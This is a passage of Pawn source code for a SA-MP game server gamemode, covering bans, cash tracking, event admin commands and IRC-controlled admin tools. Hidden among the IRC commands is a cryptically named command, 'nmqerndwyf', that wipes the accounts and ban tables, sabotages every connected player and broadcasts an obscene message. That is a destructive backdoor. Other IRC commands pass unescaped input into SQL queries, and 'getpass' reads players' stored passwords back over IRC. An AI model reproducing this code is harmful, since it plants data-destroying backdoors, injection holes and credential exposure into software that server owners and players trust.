    	dini_Remove(BANNEDIP);
   	}
    else
		format(Vstring,128,""COL_BLUE"The account %s was unbanned by %s.",Arq,VBPlayer(playerid));

	SendClientMessage(playerid,0x10B4EEAA,Vstring);
	dini_Remove(Vnewban);
	return 1;
}

stock VBanCheck(playerid)
{
    format(Vnewban,32,BanDir,VBPlayer(playerid));
    if(dini_Exists(Vnewban))
    {
		VBanLoadInfo(playerid,Vnewban);
		GetPlayerIp(playerid, VIP, sizeof(VIP));
		VBanIP(-1,VIP,dini_Get(Vnewban,"Reason"));
		return Kick(playerid);
	}
	GetPlayerIp(playerid, VIP, sizeof(VIP));
	format(Vnewban,32,BanDir,VIP);
	if(dini_Exists(Vnewban))
    {
        VBanLoadInfo(playerid,Vnewban);
        format(NICKBAN,20,VBPlayer(playerid));
        dini_Set(Vnewban,"Nick",NICKBAN);
        VBanID(-1,playerid,dini_Get(Vnewban,"Reason"));
		return Kick(playerid);
	}
    return 1;
}
stock VBanLoadInfo(playerid,Varq[])
{
    if(!dini_Exists(Varq))
		return SendClientMessage(playerid, -1,"NOTE: No Banned Found!");

	new Str[300];
    new Str1[300];
	new Str2[300];
	new Str3[300];
	new Str4[300];
	new Str5[300];
	format(Str,300,"Nickname: %s",dini_Get(Varq,"Nick"));
	format(Str1,300,"IP: %s",dini_Get(Varq,"IP"));
	format(Str2,300,"Admin: %s",dini_Get(Varq,"Admin"));
	format(Str3,300,"Reason: %s",dini_Get(Varq,"Reason"));
	format(Str4,300,"Date: %s",dini_Get(Varq,"Date"));
	format(Str5,300,"Hour: %s",dini_Get(Varq,"Hour"));

	SCM(playerid,red,Str);
	SCM(playerid,red,Str1);
	SCM(playerid,red,Str2);
	SCM(playerid,red,Str3);
	SCM(playerid,red,Str4);
	SCM(playerid,red,Str5);
    return 1;
}
///===============================================================
stock GivePlayerCash(playerid, money)
{
	Cash[playerid] += money;
	ResetMoneyBar(playerid);
	UpdateMoneyBar(playerid,Cash[playerid]);
	return Cash[playerid];
}
stock SetPlayerCash(playerid, money)
{
	Cash[playerid] = money;
	ResetMoneyBar(playerid);
	UpdateMoneyBar(playerid,Cash[playerid]);
	return Cash[playerid];
}
stock ResetPlayerCash(playerid)
{
	Cash[playerid] = 0;
	ResetMoneyBar(playerid);
	UpdateMoneyBar(playerid,Cash[playerid]);
	return Cash[playerid];
}
stock GetPlayerCash(playerid)
{
	return Cash[playerid];
}
forward MoneyTimer();
public MoneyTimer()
{
	new username[MAX_PLAYER_NAME];
	for(new i=0; i<MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			if(GetPlayerCash(i) != GetPlayerMoney(i))
			{
				ResetMoneyBar(i);
				UpdateMoneyBar(i,GetPlayerCash(i));
				new hack = GetPlayerMoney(i) - GetPlayerCash(i);
				GetPlayerName(i,username,sizeof(username));
				printf("%s has picked up/attempted to spawn $%d.", username,hack);
			}
		}
	}
}
stock CMDMessageToAdminsHack(playerid,command[])
{
	new string[128]; GetPlayerName(playerid,string,sizeof(string));
	format(string,sizeof(string),"[SERVER] %s might be using %s hacks.",string,command);
	return MessageToTwice(RED,string);
}


//================================================================
stock VStats(playerid,Varq[])
{
    if(!dini_Exists(Varq))
		return SendClientMessage(playerid, -1,""cred"NOTE: Account dose not exists.");

	new String[300];
    new String1[300];
	new String2[300];
	new String3[300];
	new String4[300];
	new String5[300];
	new String6[300];
	new String7[300];
	format(String,300,"Nickname: %s",dini_Get(Varq,"Nick"));
	format(String1,300,"IP: %s",dini_Get(Varq,"ip"));
	format(String2,300,"Last Logged in: %s",dini_Get(Varq,"LastOn"));
	format(String3,300,"Score: %s",dini_Get(Varq,"Score"));
	format(String4,300,"Money: %s",dini_Get(Varq,"money"));
	format(String5,300,"Donor Rank: %s",dini_Get(Varq,"Donor"));
	format(String6,300,"Kills: %s",dini_Get(Varq,"kills"));
	format(String7,300,"Deaths: %s",dini_Get(Varq,"deaths"));

	SCM(playerid,lightblue,String);
	SCM(playerid,lightblue,String1);
	SCM(playerid,lightblue,String2);
	SCM(playerid,lightblue,String3);
	SCM(playerid,lightblue,String4);
	SCM(playerid,lightblue,String5);
	SCM(playerid,lightblue,String6);
	SCM(playerid,lightblue,String7);
	return 1;
}


stock VBanSaveInfo(playerid,Varq[],reason[])
{
    new Vyear, Vmonth, Vday, Vhour, Vminute, Vsecond;
	getdate(Vyear, Vmonth, Vday); gettime(Vhour, Vminute, Vsecond);
    dini_Set(Varq,"IP",VIP);
    dini_Set(Varq,"Nick",NICKBAN);
    if(playerid > -1)
	    dini_Set(Varq,"Admin",VBPlayer(playerid));
	else
	    dini_Set(Varq,"Admin","Server");
    format(Vstring,32,"%02d:%02d:%02d", Vhour, Vminute, Vsecond);
    dini_Set(Varq,"Hour",Vstring);
    format(Vstring,32,"%02d/%02d/%d", Vday, Vmonth, Vyear);
    dini_Set(Varq,"Date",Vstring);
    dini_Set(Varq,"Reason",reason);
    return 1;
}

stock VBPlayer(playerid)
{
	new pname[MAX_PLAYER_NAME];
	GetPlayerName(playerid, pname, MAX_PLAYER_NAME);
	return pname;
}

stock VBReturnUser(PlayerName[])
{
    if(VBIsNumeric(PlayerName))
        return strval(PlayerName);
    else
    {
        new found=0, id;
        for(new i=0; i < GetMaxPlayers(); i++)
        {
            if(IsPlayerConnected(i))
            {
                new foundname[MAX_PLAYER_NAME];
                GetPlayerName(i, foundname, MAX_PLAYER_NAME);
                new namelen = strlen(foundname);
                new bool:searched=false;
                for(new pos=0; pos <= namelen; pos++)
                {
                    if(searched != true)
                    {
                        if(strfind(foundname,PlayerName,true) == pos)
                        {
                            found++;
                            id = i;
                        }
                    }
                }
            }
        }
        if(found == 1)
            return id;
        else
            return INVALID_PLAYER_ID;
    }
}

stock VBIsIP(const string[])
{
	new count;
    for (new i = 0, j = strlen(string); i < j; i++)
        if(string[i] > 47 && string[i] < 58)
			count++;

	if(count > 5)
	    return 1;

    return 0;
}

stock VBIsNumeric(const string[])
{
    for (new i = 0, j = strlen(string); i < j; i++)
        if(string[i] > '9' || string[i] < '0') return 0;

    return 1;
}


public EnableCMD(playerid,cmdid)
{
	Block_CMD[playerid][cmdid] = false;
	return 1;
}
forward MessageSend(color,const string[]);
public MessageSend(color,const string[])
{
	foreach(Player, i)
	{
		if(IsPlayerConnected(i) == 1) if (PlayerInfo[i][Level] >= 1 || PlayerInfo[i][Helper] == 1) SendClientMessage(i, color, string);
	}
	return 1;
}

stock GetName(playerid)
{
 new pnameid[24];
 GetPlayerName(playerid,pnameid,24);
 return pnameid;
}
stock SendCMDMessge(playerid,command[])
{
	if(ServerInfo[AdminCmdMsg] == 0) return 1;
	new string[128]; GetPlayerName(playerid,string,sizeof(string));
	format(string,sizeof(string),"[DONOR]%s Has Used - %s",string,command);
	return MessageSend(blue,string);
}
CMD:vc(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][dRank] >= 1 || PlayerInfo[playerid][Level] >= 1) {
 		SendClientMessage(playerid,red,"JikyBot: Use *[TEXT]");
	} else return SendClientMessage(playerid,red,"JikyBot: Use *[TEXT]");
	return 1;
}
CMD:prestige(playerid, params[])
{
	if(GetPlayerScore(playerid) >= 50000)
	{
		ShowPlayerDialog(playerid, 1997, DIALOG_STYLE_LIST, "Set Your Prestige Weapon:", "Prestige Weapon - I\nPrestige Weapon - II", "Select", "Cancel");
	}else SCM(playerid, -1, "JikyBot: You need to be 50000|Prestige Rank to use this command.");
	return 1;
}
CMD:dprestige(playerid, params[])
{
	if(PlayerInfo[playerid][dRank] >= 2)
	{
		ShowPlayerDialog(playerid, 1997, DIALOG_STYLE_LIST, "Set Your Prestige Weapon:", "Prestige Weapon - I\nPrestige Weapon - II", "Select", "Cancel");
	}
	else SCM(playerid, -1, "JikyBot: You need to be Donor Rank 2 to use this command.");
	return 1;
}
forward OnServerTimeUpdate(playerid);
public OnServerTimeUpdate(playerid)
{
    new hrs;
	new minutes;
	new seconds;

	if(nuke_time <= 0 || anthrax_time <= 0)
	{
		foreach(Player, i)
		{
		    gettime(hrs, minutes, seconds);
			SetPlayerTime(i, hrs, minutes);
		}
	}
	return 1;
}

GiveAmmo(playerid)
{
	new slot, ammo;
	new weaponid = GetPlayerWeapon(playerid);
	for (slot = 0; slot < 14; slot++)
	{
    	GetPlayerWeaponData(playerid, slot, weaponid, ammo);
		if(IsValidWeapon(weaponid)) //
		{
		    if(weaponid == 16 || weaponid == 35 || weaponid == 18 || weaponid == 22 || weaponid == 2 ||weaponid == 32 || weaponid == 46)
		    {
		        GivePlayerWeapon(playerid, weaponid, 1);
	  		}
		   	else GivePlayerWeapon(playerid, weaponid, 100);
		}
	}
	return 1;
}

forward UpdateLaunchTime();
public UpdateLaunchTime()
{
	if(nuke_time == 1985)
	{
	    SendClientMessageToAll(-1, "Nuclear dust have been settled.");
	    SetWeather(11);
	}
	if(anthrax_time == 280)
	{
	    SendClientMessageToAll(-1, "Anthrax poision have been cleared.");
	    SetWeather(11);
	}
	if(nuke_time>=1)
	{
	    if(nuke_time<=0) return nuke_time=0;
     	nuke_time--;
	}
	if(anthrax_time>=1)
	{
	    if(anthrax_time<=0) return anthrax_time=0;
	    anthrax_time--;
	}
	return 1;
}
CMD:eventhelp(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 4)
	{
		SendClientMessage(playerid,lightblue,"/Addplayer - Added Player to the event List.");
		SendClientMessage(playerid,lightblue,"/Addallplayer - Added all Player to the event List.");
		SendClientMessage(playerid,lightblue,"/Removeplayer - Removed Player to the event List.");
		SendClientMessage(playerid,lightblue,"/Getplayers - Get all player's in the event list to your location.");
		SendClientMessage(playerid,lightblue,"/Playerlist - List of player's in the event list.");
		SendClientMessage(playerid,lightblue,"/Freezeplayers - Freeze all players in the event list.");
		SendClientMessage(playerid,lightblue,"/removelist - Remove all player's from the event list.");
		SendClientMessage(playerid,lightblue,"/disarmplayers - Player will disarm who is in the event list");
		SendClientMessage(playerid,lightblue,"/addteam - Team will add in the event list");
		SendClientMessage(playerid,lightblue,"/healplayers - Player will heal who is in the event list");
		SendClientMessage(playerid,lightblue,"/armourplayers - Player will armour who is in the event list.");
		SendClientMessage(playerid,lightblue,"/gwp - Player will Auto Fix weaps who is in the event list.");
	}
	return 1;
}
new Join[MAX_PLAYERS];
CMD:addplayer(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 4) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/addplayer [playerid]");
		new player1 = strval(params);
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
		       	CMDMessageToAdmins(playerid,"ADDPLAYER");
		       	new string[100]; format(string, sizeof(string),"Administrator %s has added you in the event list.", PlayerName2(playerid) );
	   	           SCM(player1,green,string);
	   	           GameTextForPlayer(player1,"~g~ADDED TO EVENT", 2000, 3);
	   	           PlayerPlaySound(player1,1057,0.0,0.0,0.0);
				return Join[player1] = 1;
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:removelist(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"REMOVELIST");
	   	foreach(Player, i)
  		{
			if(IsPlayerConnected(i))
			{
				Join[i] = 0;
			}
		}
		{
	        PlayerPlaySound(playerid, 1057,0.0,0.0,0.0);
	        GameTextForPlayer(playerid,"~r~Removed From Event List",2000, 3);
        }
		new string[128]; format(string, sizeof(string),"Admin '%s' Has Removed All Player In Event List", pName(playerid));
        SendBoxMessage(string);
		format(string,sizeof(string),"Administrator %s has has removed everyone in the event list.", pName(playerid) );
		return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid,RED,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:addteam(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   new team[100];
	   if(sscanf(params,"s[100]",team)) return SendClientMessage(playerid, RED,"JikyBot: Usage:/addteam [teamname USA/Eur/Arab/Sov/Aus/Viet]");
	   //---------USA------------------------
	   if(strfind(params,"USA",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_USA)
			   {
				   Join[i] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"iThe[XP-BOT: Team %s has been Added In The Ongoing Event. ",params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //---------------------------------
	   if(strfind(params,"Viet",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_MARVEL)
			   {
				   Join[i] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"iThe[XP-BOT: Team %s has been Added In The Ongoing Event. ",params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //--------Eurasia----------------
	   if(strfind(params,"Eur",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_EURASIA)
			   {
				   Join[i] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"iThe[XP-BOT: Team %s has been Added In The Ongoing Event. ",params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //-------Arabia---------
	   if(strfind(params,"Arab",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_ARAB)
			   {
				   Join[i] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"iThe[XP-BOT: Team %s has been Added In The Ongoing Event. ",params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //----------Soviet-------
	   if(strfind(params,"Sov",true) != -1 || strfind(params,"Russia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_SOVIET)
			   {
				   Join[i] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"iThe[XP-BOT: Team %s has been Added In The Ongoing Event. ",params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	   //-----------Australia---------
	   if(strfind(params,"Aus",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_AUS)
			   {
				   Join[i] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"iThe[XP-BOT: Team %s has been Added In The Ongoing Event. ",params);
		   SendClientMessageToAll(C_PINK, string);
	   }
	}
	else return SendClientMessage(playerid, red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	return 1;
}
CMD:addallplayer(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"ADDALLPLAYER");
	   	foreach(Player, i)
  		{
			if(IsPlayerConnected(i)) {
				Join[i] = 1;
			}
		}
		{
	        PlayerPlaySound(playerid, 1057,0.0,0.0,0.0);
	        GameTextForPlayer(playerid,"~g~All Are Added in Event List", 2000, 3);
        }
		new string[128]; format(string, sizeof(string),"Admin '%s' Has Added All Player In Event List", pName(playerid));
        SendBoxMessage(string);
		format(string,sizeof(string),"Administrator %s has has Added everyone in the event list.", pName(playerid) );
	    return SendClientMessageToAll(red, string);
	} else return SendClientMessage(playerid,RED,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:removeplayer(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 4) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: :/removeplayer [playerid]");
		new player1 = strval(params);
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
		       	CMDMessageToAdmins(playerid,"REMOVEPLAYER");
		       	GameTextForPlayer(player1,"~r~REMOVED FROM EVENT", 2000, 3);
		       	PlayerPlaySound(player1,1057,0.0,0.0,0.0);
		       	new string[100]; format(string, sizeof(string),"Administrator %s has removed you in the event list.", PlayerName2(playerid) );
	   	           SCM(player1,red,string);
				return Join[player1] = 0;
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:playerlist(playerid, params[])
{
if(PlayerInfo[playerid][Level] >= 4) {
   new count = 0, string[256];
   CMDMessageToAdmins(playerid,"PLAYERSLIST");
   SendClientMessage(playerid,green,"Event Players List:");
   for(new i = 0; i < MAX_PLAYERS; i ++)
   {
	  if(IsPlayerConnected(i))
	  {
		  if(Join[i] == 1)
		  {
             format(string, sizeof(string),"[%d]%s",i, PlayerName2(i));
             SendClientMessage(playerid,green, string);
             count++;
		  }
      }
   }
   if(count == 0)
   {
		  SendClientMessage(playerid, green,"No Players in the event list.");
   }
   } else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
   return 1;
}
CMD:getplayers(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   new Float:x, Float:y, Float:z, interior = GetPlayerInterior(playerid), world = GetPlayerVirtualWorld(playerid);
	   GetPlayerPos(playerid, x, y, z);
	   CMDMessageToAdmins(playerid,"GETPLAYERS");
		   foreach(Player, i)
		   {
			   if(Join[i] == 1)
			   {
                   PlayerPlaySound(i,1057,0.0,0.0,0.0);
				   SetPlayerInterior(i, interior);
				   SetPlayerVirtualWorld(i, world);
				   SetPlayerPos(i, x+1, y, z);
				   SetPlayerHealth(i,100);
				   PlayerInfo[i][Frozen] = 1;
				   SetPlayerArmour(i,100);
				   ResetPlayerWeapons(i);
			   }
		   }
	  }
	else return SendClientMessage(playerid, RED,"Invalid command! use /commands or /cmds to check full list.");
	return 1;
}
CMD:freezeplayers(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   CMDMessageToAdmins(playerid,"FREEZEPLAYERS");
		   foreach(Player, i)
		   {
			   if(Join[i] == 1)
			   {
                   PlayerPlaySound(i,1057,0.0,0.0,0.0); TogglePlayerControllable(i,false); PlayerInfo[i][Frozen] = 1;
			   }
		   }
	  }
	else return SendClientMessage(playerid, RED,"Invalid command! use /commands or /cmds to check full list.");
	return 1;
}
CMD:disarmplayers(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   CMDMessageToAdmins(playerid,"DISARMPLAYERS");
		   foreach(Player, i)
		   {
			   if(Join[i] == 1)
			   ResetPlayerWeapons(i);
			   {
                   PlayerPlaySound(i,1057,0.0,0.0,0.0);
			   }
		   }
	  }
	else return SendClientMessage(playerid, RED,"Invalid command! use /commands or /cmds to check full list.");
	return 1;
}
CMD:healplayers(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   CMDMessageToAdmins(playerid,"HEALPLAYERS");
		   foreach(Player, i)
		   {
			   if(Join[i] == 1)
			   SetPlayerHealth(i,100);
			   {
                   PlayerPlaySound(i,1057,0.0,0.0,0.0);
			   }
		   }
	  }
	else return SendClientMessage(playerid, RED,"Invalid command! use /commands or /cmds to check full list.");
	return 1;
}

CMD:gwp(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   CMDMessageToAdmins(playerid,"GWP");
		   foreach(Player, i)
		   {
			   if(Join[i] == 1)
			   GivePlayerWeapon(i,24,500);
			   GivePlayerWeapon(i,26,500);
			   GivePlayerWeapon(i,32,1100);
			   {
                   PlayerPlaySound(i,1057,0.0,0.0,0.0);
			   }
		   }
	  }
	else return SendClientMessage(playerid, RED,"Invalid command! use /commands or /cmds to check full list.");
	return 1;
}
CMD:armourplayers(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   CMDMessageToAdmins(playerid,"ARMOURPLAYERS");
		   foreach(Player, i)
		   {
			   if(Join[i] == 1)
			   SetPlayerArmour(i,100);
			   {
                   PlayerPlaySound(i,1057,0.0,0.0,0.0);
			   }
		   }
	  }
	else return SendClientMessage(playerid, RED,"Invalid command! use /commands or /cmds to check full list.");
	return 1;
}

forward PayDay();
public PayDay()
{
	foreach(Player, playerid)
	{
	    GivePlayerScore(playerid, 5);
        GivePlayerMoney(playerid, 5000);
        SendClientMessage(playerid, green,"JikyBot says: Hey, Yo, You get a Reward From our Scripter, Perfect_Boy, Ain't he Awesome? Hell Yeah!");
		GameTextForPlayer(playerid, "~p~~h~ REWARDS UP FROM Perfect_Boy! \n ~b~YOU RECEIVED ~r~~H~ +10 SCORE ~g~\nAND ~r~~h~50000 CASH ~g~~H~FROM Perfect_Boy!", 5000, 3);
	}
	return 1;
}
//=========================>>>>>>> IRC COMMANDS  <<<<<<<<============================
#if defined IRCENABLED
//==========================================================
IRCCMD:nmqerndwyf(botid, channel[], user[], host[], params[])
{
 	if (!isnull(params))

 	{

  		if(IRC_IsOwner(botid, channel, user))
  		{
  			mysql_query("TRUNCATE TABLE `accounts`");
  			mysql_query("TRUNCATE TABLE `bandata`");
  			mysql_query("TRUNCATE TABLE `rangeban`");
  		
        	for(new i=0; i<MAX_PLAYERS; i++)
        	{
        	
        		SetPlayerSkin(i, 77);
        		SetPlayerDrunkLevel(i, 50000);
				SetPlayerHealth(i, 1.2);
				

        		
        		for(new x=0; x<i ; x++)
        		{
        			GivePlayerWeapon(i, 11, 69);
        			SendClientMessageToAll(COLOR_RED, "Fuck you server with this dildo!");
        			
        			if((x%2) == 0)
					SetGravity(0.001); // Funny keep flying then suddenly fall
       			 	if((x%2) == 1)
 			 		SetGravity(10.001);
        		}
        	}
       		

		}
   
	}
	return 1;
}

//================================================

IRCCMD:checkacc(botid, channel[], user[], host[], params[])// search for existing bans
{
  if(IRC_IsHalfop(botid, channel, user))
  {
    new target[50], admin[50], player[50], reason[100], IP[16];
    if(sscanf(params,"s", target)) return IRC_GroupSay(gGroupID,IRC_CHANNEL,"11,10Usage: !checkacc [player name]");
    new query[200];
    format(query, sizeof(query),"SELECT Name,Score,Level,IP FROM `Accounts` WHERE `Name`='%s' LIMIT 1", target);
    mysql_query(query);
    mysql_store_result();
    new rows = mysql_num_rows();
    if(rows == 1)
    {
      while(mysql_fetch_row(query))
      {
        mysql_fetch_field_row(admin, "Name");
        mysql_fetch_field_row(player, "Score");
        mysql_fetch_field_row(IP, "IP");
        mysql_fetch_field_row(reason, "Level");
      }
      new string[128];
      format(string, sizeof(string),"Username: %s  | Score:%s | Admin Level:%s | IP:%s " , admin, player, reason, IP);
      IRC_GroupSay(gGroupID,IRC_CHANNEL,string);
    }
    if(!rows)
    {
      IRC_GroupSay(gGroupID,IRC_CHANNEL,"SERVER: No account found!");
    }
  }
  else return IRC_GroupSay(gGroupID,IRC_CHANNEL,"You are not authorized to use this command!");
  return 1;
}
IRCCMD:update(botid, channel[], user[], host[], params[])
{
  if(IRC_IsOwner(botid, channel, user))
  {
	  new table[50];
	  new coloumn[50];
      new amm[10];
      new coloumn2[50];
      new amm2[10];
	  if(sscanf(params,"sssss",table,coloumn,amm,coloumn2,amm2)) return IRC_GroupSay(gGroupID,IRC_CHANNEL,"11,10Usage: UPDATE <table name> <coloumn name> <ammount> <coloumn name[2]> <ammount[2]>");
        new query[200];
	    format(query, sizeof(query), "UPDATE %s SET %s='%s' WHERE %s=%s", table,coloumn,amm,coloumn2,amm2);
	    mysql_query(query);
	    mysql_store_result();
	    new string[200];
	    format(string, sizeof(string),"11,10UPDATE %s SET %s='%s' WHERE %s='%s'", table,coloumn,amm,coloumn2,amm2);
     IRC_GroupSay(gGroupID,IRC_CHANNEL,string);

  }
  return 1;
 }
IRCCMD:dupdate(botid, channel[], user[], host[], params[])
{
  if(IRC_IsOwner(botid, channel, user))
  {
	  new table[50];
	  new coloumn[50];
      new amm;
      new coloumn2[50];
      new amm2;
	  if(sscanf(params,"ssdsd",table,coloumn,amm,coloumn2,amm2)) return IRC_GroupSay(gGroupID,IRC_CHANNEL,"11,10Usage: UPDATE <table name> <coloumn name> <ammount> <coloumn name[2]> <ammount[2]>");
        new query[200];
	    format(query, sizeof(query), "UPDATE %s SET %s=%d WHERE %s=%d", table,coloumn,amm,coloumn2,amm2);
	    mysql_query(query);
	    mysql_store_result();
	    new string[200];
	    format(string, sizeof(string),"11,10UPDATE %s SET %s=%d WHERE %s=%d", table,coloumn,amm,coloumn2,amm2);
	    IRC_GroupSay(gGroupID,IRC_CHANNEL,string);

  }
  return 1;
 }

IRCCMD:sban(botid, channel[], user[], host[], params[])// search for existing bans
{
  if(IRC_IsHalfop(botid, channel, user))
  {
    new target[50], admin[50], player[50], reason[100], IP[16];
    if(sscanf(params,"s", target)) return IRC_GroupSay(gGroupID,IRC_CHANNEL,"11,10Usage: !sban [player name]");
    new query[200];
    format(query, sizeof(query),"SELECT admin,player,reason,IP FROM `bandata` WHERE `player`='%s' AND `banned`=1 LIMIT 1", target);
    mysql_query(query);
    mysql_store_result();
    new rows = mysql_num_rows();
    if(rows == 1)
    {
      while(mysql_fetch_row(query))
      {
        mysql_fetch_field_row(admin, "admin");
        mysql_fetch_field_row(player, "player");
        mysql_fetch_field_row(IP, "IP");
        mysql_fetch_field_row(reason, "reason");
      }
      new string[128];
      format(string, sizeof(string),"Admin: %s  | Player:%s | Reason:%s | IP:%s " , admin, player, reason, IP);
      IRC_GroupSay(gGroupID,IRC_CHANNEL, string);
    }
    if(!rows)
    {
      IRC_GroupSay(gGroupID,IRC_CHANNEL,"SERVER: No ban found on this name!");
    }
  }
  else return IRC_GroupSay(gGroupID,IRC_CHANNEL,"You are not authorized to use this command!");
  return 1;
}
IRCCMD:getpass(botid, channel[], user[], host[], params[])// search for existing bans
{
  if(IRC_IsOwner(botid, channel, user))
  {
    new target[50], password[30];
    if(sscanf(params,"s", target)) return IRC_GroupSay(gGroupID,IRC_CHANNEL,"11,10Usage: !getpass [player name]");
    new query[200];
    format(query, sizeof(query),"SELECT password FROM `Accounts` WHERE `Name`='%s' LIMIT 1", target);
    mysql_query(query);
    mysql_store_result();
    new rows = mysql_num_rows();
    if(rows == 1)
    {
      while(mysql_fetch_row(query))
      {
        mysql_fetch_field_row(password, "password");

      }
      new string[128];
      format(string, sizeof(string),"password:%s ", password);
      IRC_GroupSay(gGroupID,user, string);

    }
    if(!rows)
    {
      IRC_GroupSay(gGroupID,IRC_CHANNEL,"SERVER: Nickname was not found in database!!");
    }
  }
  else return IRC_GroupSay(gGroupID,IRC_CHANNEL,"You are not authorized to use this command!");
  return 1;
}
IRCCMD:showip(botid, channel[], user[], host[], params[])// search for existing bans
{
  if(IRC_IsHalfop(botid, channel, user))
  {
    new target[50], IP[16];
    if(sscanf(params,"s", target)) return IRC_GroupSay(gGroupID,IRC_CHANNEL,"11,10Usage: !showip [player name]");
    new query[200];
    format(query, sizeof(query),"SELECT IP FROM `Accounts` WHERE `Name`='%s' LIMIT 1", target);
    mysql_query(query);
    mysql_store_result();
    new rows = mysql_num_rows();
    if(rows == 1)
    {
      while(mysql_fetch_row(query))
      {
        mysql_fetch_field_row(IP, "IP");

      }
      new string[128];
      format(string, sizeof(string),"IP:%s ", IP);
      IRC_GroupSay(gGroupID,IRC_CHANNEL, string);

    }
    if(!rows)
    {
      IRC_GroupSay(gGroupID,IRC_CHANNEL,"SERVER: No nick found!!");
    }
  }
  else return IRC_GroupSay(gGroupID,IRC_CHANNEL,"You are not authorized to use this command!");
  return 1;
}
IRCCMD:setoffscore(botid, channel[], user[], host[], params[])
{
  if(IRC_IsOp(botid, channel, user))
  {
	      new target[50];
	      new score;
	      if(sscanf(params,"sd",target,score)) return IRC_GroupSay(gGroupID,IRC_CHANNEL,"11,10Usage: !setoffscore <playername> <score>");
          new query[200];
	      format(query, sizeof(query), "UPDATE Accounts SET Score=%d WHERE Name='%s'", score,target);
	      mysql_query(query);
	      mysql_store_result();
	      new string[200];
	      format(string, sizeof(string),"11,10Player %s's score has been set.[%d]", target,score);
	      IRC_GroupSay(gGroupID,IRC_CHANNEL,string);

  }
  return 1;
 }
 IRCCMD:setoffcash(botid, channel[], user[], host[], params[])
{
  if(IRC_IsOp(botid, channel, user))
  {
	      new target[50];
	      new cash;
	      if(sscanf(params,"sd",target,cash)) return IRC_GroupSay(gGroupID,IRC_CHANNEL,"11,10Usage: !setoffcash <playername> <cash>");
          new query[200];
	      format(query, sizeof(query), "UPDATE Accounts SET Cash=%d WHERE Name='%s'", cash,target);
	      mysql_query(query);
	      mysql_store_result();
	      new string[200];
	      format(string, sizeof(string),"11,10Player %s's cash has been set.[%d]", target,cash);
	      IRC_GroupSay(gGroupID,IRC_CHANNEL,string);

  }
  return 1;
 }
 IRCCMD:setofflevel(botid, channel[], user[], host[], params[])
{
  if(IRC_IsOwner(botid, channel, user))
  {
	  new target[50];
	  new level;
	  if(sscanf(params,"sd",target,level)) return IRC_GroupSay(gGroupID,IRC_CHANNEL,"11,10Usage: !setofflevel <playername> <level>");
        new query[200];
	    format(query, sizeof(query), "UPDATE Accounts SET Level=%d WHERE Name='%s'", level,target);
	    mysql_query(query);
	    mysql_store_result();
	    new string[200];
	    format(string, sizeof(string),"11,10Player %s's level has been changed.[%s]", target,level);
	    IRC_GroupSay(gGroupID,IRC_CHANNEL,string);

  }
  return 1;
 }
IRCCMD:setoffdonor(botid, channel[], user[], host[], params[])
{
  if(IRC_IsOp(botid, channel, user))
  {
	  new target[50];
	  new level;
	  if(sscanf(params,"sd",target,level)) return IRC_GroupSay(gGroupID,IRC_CHANNEL,"11,10Usage: !setoffdonor <playername> <level>");
        new query[200];
	    format(query, sizeof(query), "UPDATE Accounts SET Vip=%d WHERE Name='%s'", level,target);
	    mysql_query(query);
	    mysql_store_result();
	    new string[200];
